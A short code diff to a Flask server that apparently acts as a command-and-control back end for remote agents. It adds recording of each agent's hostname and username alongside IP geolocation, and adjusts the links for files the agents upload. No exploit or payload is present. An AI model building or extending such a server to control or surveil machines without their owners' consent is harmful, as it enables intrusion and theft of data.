@@ -82,6 +82,10 @@ def get_command(agent_id):
     if info:
         if 'platform' in info:
             agent.operating_system = info['platform']
+        if 'hostname' in info:
+            agent.hostname = info['hostname']
+        if 'username' in info:
+            agent.username = info['username']
     agent.last_online = datetime.now()
     agent.remote_ip = request.remote_addr
     agent.geolocation = geolocation(agent.remote_ip)
@@ -125,8 +129,8 @@ def upload(agent_id):
             filename = "_" + filename
             file_path = os.path.join(store_dir, filename)
         file.save(file_path)
-        download_link = url_for('webui.uploads', path=os.path.join(agent_dir, filename))
-        agent.output += 'File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
+        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
+        agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
         db.session.add(agent)
         db.session.commit()
     return ''
